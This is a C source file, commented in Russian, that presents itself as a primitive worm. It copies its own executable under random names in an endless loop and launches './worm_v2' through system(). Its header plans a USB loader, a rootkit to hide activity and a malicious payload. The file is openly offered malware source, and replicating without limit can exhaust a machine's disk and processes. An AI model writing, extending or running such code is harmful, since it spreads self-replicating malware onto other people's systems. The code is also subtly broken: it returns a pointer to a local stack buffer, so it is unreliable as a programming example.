/*
    Данная программа реализует
    примитивного червя.
    Функционал заключается в создании копий
    самого себя

    Из дополнительного софта:
    1) загрузчик червя
    2) загрузчик с USB
    3) Root-kit для сокрытия деятельности
    4) Вредоносный функционал 
      (пока не придумал, что это будет)
*/


#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>     // для sleep
#include <string.h>



enum ERRORS {
    CANT_OPEN_A_FILE = 0xA
};


/* Тестовый механизм: 
   Копирование exe файла
*/
void copy_executable(const char* path, char* name)
{

    FILE* fp_exe = fopen(path, "rb");
    if (fp_exe == NULL) {
        // Для отладки работы
        fprintf(stderr, "Can't open the file %s", path);
        exit(CANT_OPEN_A_FILE);
    }
    else {
        FILE* copy_exe = fopen(name, "w");


        if (copy_exe != NULL) {
            int bytes;
            while ((bytes = getc(fp_exe)) != EOF) {
                putc(bytes, copy_exe);
            }

            fclose(copy_exe);
        }
        else {
            fprintf(stderr, "Pemission denied or can't open a file\n");
            exit(CANT_OPEN_A_FILE);
        }

        fclose(fp_exe);
    }
}

/*
    Создание нового имени для файла
*/
char* create_the_name()
{
    const unsigned int maxBuffer = 10;
    char name[maxBuffer]; char* ptr_name = NULL;

    srand(time(NULL));
    for (int i = 0; i < maxBuffer; i++) {
        unsigned int random = rand() % 10;
        switch (random)
        {
        case 0:
            name[i] = 'a';
            break;
        case 1:
            name[i] = 'b';
            break;
        case 2:
            name[i] = 'c';
            /* code */
            break;
        case 3:
            name[i] = 'd';
            /* code */
            break;
        case 4:
            name[i] = 'e';
            /* code */
            break;
        case 5:
            name[i] = 'f';
            /* code */
            break;
        case 6:
            name[i] = 'g';
            /* code */
            break;
        case 7:
            name[i] = 'h';
            /* code */
            break;
        case 8:
            name[i] = 'i';
            /* code */
            break;
        case 9:
            name[i] = 'j';
            /* code */
            break;
        }
    }

    name[maxBuffer - 1] = '\0';
    // memset(ptr_name, 0, maxBuffer);

    // strcpy(ptr_name, name);
    ptr_name = name;

    return ptr_name;
}

void create_lots_of(void (*ptr_copy_exec)(const char*, char*), const char* path)
{   
    char* name = NULL;
    name = create_the_name();
    ptr_copy_exec(path, name);
}

int main(int argc, char** argv)
{
    // while (1) {
    //     // srand(time(NULL));
    //     create_lots_of(&copy_executable, argv[0]);
    //     sleep(3);
    // }
    
    /* Запуск вредоноса */
    while (1)
    {
        create_lots_of(&copy_executable, argv[0]);
        // sleep(1);
        // Системно зависимая вещь
        system("./worm_v2");
    }
    return EXIT_SUCCESS;
}
